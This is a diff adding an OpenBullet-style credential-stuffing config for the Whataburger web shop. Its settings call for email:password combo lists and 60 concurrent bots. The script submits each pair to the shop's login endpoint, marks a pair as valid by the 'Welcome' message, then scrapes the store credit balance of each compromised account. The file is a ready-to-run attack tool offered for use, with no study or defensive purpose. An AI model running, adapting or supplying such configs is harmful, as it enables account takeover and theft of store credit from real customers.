@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Whataburger",
+  "SuggestedBots": 60,
+  "LastModified": "2018-10-29T20:45:22.5977114+00:00",
+  "AdditionalInfo": "Whataburger WEBSITE|NOT APP|Proxyless|Captures Store Credit Amount|",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "7",
+      "Id": 398804911
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "20",
+      "Id": 1549287498
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 508343278
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://shop.whataburger.com/login.php?action=check_login" AutoRedirect=TRUE 
+  CONTENT "login_email=<USER>&login_pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://shop.whataburger.com/login.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "=\"welcomeMsg\">Welcome " 
+  KEYCHAIN Failure OR 
+    KEY "incorrect" 
+REQUEST POST "https://shop.whataburger.com/account.php?action=view_orders" AutoRedirect=TRUE 
+  CONTENT "login_email=<USER>&login_pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "You have " 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You have <strong></strong> of store credit. " 
+PARSE "<SOURCE>" LR "You have <strong>" "<" Recursive=FALSE -> CAP "Store Credit" "" "" 
